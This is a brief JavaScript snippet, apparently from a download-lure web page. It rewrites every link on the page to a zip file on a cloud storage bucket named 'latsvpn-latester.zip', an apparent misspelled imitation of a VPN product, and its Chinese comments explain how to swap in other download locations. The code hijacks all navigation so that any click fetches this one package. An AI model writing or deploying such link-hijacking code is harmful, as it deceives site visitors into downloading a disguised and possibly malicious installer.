 

var xz = "https://pub-a8564b270ee64f5c92e3b2b03fae65a3.r2.dev/latsvpn-latester.zip";

//可以把   /xiazai/letspn-latest64.zip  这个改成下载地址；https://guoxiauzausj.oss-rg-china-mainland.aliyuncs.com/letspn-latest64.zip
//可以把   https://guoxiauzausj.oss-rg-china-mainland.aliyuncs.com/letspn-latest64.zip  这个改成文件下载：/xiazai/kuailian.zip



var links = document.getElementsByTagName("a");
for (var i = 0; i < links.length; i++) {
    if (links[i].hasAttribute("href")) {
        links[i].href = xz;
    }
} 
